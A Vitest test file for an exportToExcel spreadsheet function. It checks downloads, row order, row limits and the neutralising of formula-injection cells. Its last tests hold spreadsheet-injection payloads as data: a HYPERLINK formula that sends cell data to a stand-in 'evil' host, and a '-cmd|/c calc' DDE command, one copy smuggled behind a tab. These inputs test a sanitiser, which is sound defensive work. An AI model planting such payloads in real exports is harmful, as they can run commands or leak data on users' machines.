import { describe, it, expect, vi, beforeEach } from "vitest";
import type { ExportRow } from "@/lib/export";

const addWorksheet = vi.fn();
const addRow = vi.fn();
const writeBuffer = vi.fn();

vi.mock("exceljs", () => {
  class MockWorkbook {
    xlsx = { writeBuffer };
    addWorksheet = addWorksheet;
  }

  return {
    default: { Workbook: MockWorkbook },
  };
});

describe("exportToExcel", () => {
  let createObjectURLMock: ReturnType<typeof vi.fn>;
  let revokeObjectURLMock: ReturnType<typeof vi.fn>;
  let removeMock: ReturnType<typeof vi.fn>;
  let clickMock: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    vi.clearAllMocks();

    addRow.mockClear();
    addWorksheet.mockReturnValue({ addRow });
    writeBuffer.mockResolvedValue(new ArrayBuffer(8));

    createObjectURLMock = vi.fn().mockReturnValue("blob:mock-export");
    revokeObjectURLMock = vi.fn();

    Object.defineProperty(globalThis, "URL", {
      value: {
        ...URL,
        createObjectURL: createObjectURLMock,
        revokeObjectURL: revokeObjectURLMock,
      },
      configurable: true,
    });

    const originalCreateElement = document.createElement.bind(document);
    removeMock = vi.fn();
    clickMock = vi.fn();
    vi.spyOn(document, "createElement")
      .mockImplementation((tagName: string) => {
        if (tagName === "a") {
          return {
            href: "",
            download: "",
            click: clickMock,
            remove: removeMock,
          } as unknown as HTMLAnchorElement;
        }

        return originalCreateElement(tagName);
      });
    vi.spyOn(document.body, "appendChild").mockImplementation((node: Node) => node);
  });

  it("gera download .xlsx com nome correto", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Nome", "Score"];
    const rows: ExportRow[] = [{ Nome: "João", Score: 85 }];

    await exportToExcel("relatorio-teste", headers, rows);

    expect(clickMock).toHaveBeenCalledOnce();
    expect(removeMock).toHaveBeenCalledOnce();
    expect(createObjectURLMock).toHaveBeenCalledOnce();
    expect(revokeObjectURLMock).toHaveBeenCalledWith("blob:mock-export");
  });

  it("cria folha com cabeçalho e linha de dados na ordem correta", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["A", "B", "C"];
    const rows: ExportRow[] = [{ C: 3, A: 1, B: 2 }];

    await exportToExcel("test", headers, rows);

    expect(addWorksheet).toHaveBeenCalledWith("Dados");
    expect(addRow).toHaveBeenNthCalledWith(1, headers);
    expect(addRow).toHaveBeenNthCalledWith(2, [1, 2, 3]);
  });

  it("substitui valores undefined por null", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Nome", "Score", "Obs"];
    const rows: ExportRow[] = [{ Nome: "Pedro", Score: 70 }];

    await exportToExcel("test", headers, rows);

    expect(addRow).toHaveBeenNthCalledWith(2, ["Pedro", 70, null]);
  });

  it("neutraliza strings iniciadas por fórmula para evitar excel injection", async () => {
    const { exportToExcel } = await import("@/lib/export");
    await exportToExcel("test", ["Nome", "Obs"], [{ Nome: "Ana", Obs: "=HYPERLINK(\"x\")" }]);

    expect(addRow).toHaveBeenNthCalledWith(2, ["Ana", "'=HYPERLINK(\"x\")"]);
  });

  it("lança erro quando número de linhas excede o limite de segurança", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const rows = Array.from({ length: 50001 }, (_, i) => ({ Col: i }));

    await expect(exportToExcel("test", ["Col"], rows)).rejects.toThrow(
      "Exportação excede o limite de 50000 linhas"
    );
  });

  it("escreve o buffer do workbook exatamente uma vez", async () => {
    const { exportToExcel } = await import("@/lib/export");
    await exportToExcel("test", ["Col"], [{ Col: "valor" }]);

    expect(writeBuffer).toHaveBeenCalledOnce();
    expect(document.body.appendChild).toHaveBeenCalledOnce();
  });

  it("neutralises CSV/Excel formula triggers in string cells", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Contador", "Nota", "Endereco", "Tipo", "Padded", "Score"];
    const rows: ExportRow[] = [{
      Contador: "=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
      Nota: "+1234567",
      Endereco: "-cmd|/c calc",
      Tipo: "@SUM(A1:A2)",
      // Leading whitespace + formula char must still be neutralised — sanitiser
      // calls trimStart() before checking, so the formula prefix is detected
      // even when smuggled behind a tab.
      Padded: "\t=cmd|/c calc",
      Score: 85,
    }];

    await exportToExcel("test", headers, rows);

    expect(addRow).toHaveBeenNthCalledWith(2, [
      "'=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
      "'+1234567",
      "'-cmd|/c calc",
      "'@SUM(A1:A2)",
      "'\t=cmd|/c calc",
      // Numbers are passed through untouched.
      85,
    ]);
  });

  it("does not modify benign string cells", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Nome", "Morada"];
    const rows: ExportRow[] = [{ Nome: "Maria João", Morada: "Rua das Flores 12" }];

    await exportToExcel("test", headers, rows);

    expect(addRow).toHaveBeenNthCalledWith(2, ["Maria João", "Rua das Flores 12"]);
  });
});
